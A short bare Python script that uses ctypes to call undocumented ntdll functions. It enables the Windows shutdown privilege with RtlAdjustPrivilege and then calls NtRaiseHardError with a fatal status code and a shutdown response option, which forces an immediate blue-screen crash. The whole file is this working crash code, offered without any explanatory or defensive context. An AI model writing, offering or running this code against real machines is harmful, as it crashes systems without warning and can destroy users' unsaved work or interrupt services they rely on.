import ctypes
import nt 
ntdll = ctypes.windll.LoadLibrary("ntdll.dll")
a = ctypes.create_string_buffer(1)
ntdll.RtlAdjustPrivilege(ctypes.c_uint(19), ctypes.c_int(1), ctypes.c_int(0), a)
b = ctypes.create_string_buffer(8)
ntdll.NtRaiseHardError(ctypes.c_int(3221226528), ctypes.c_uint(0), ctypes.c_uint(0), ctypes.c_uint(0), ctypes.c_uint(6), b)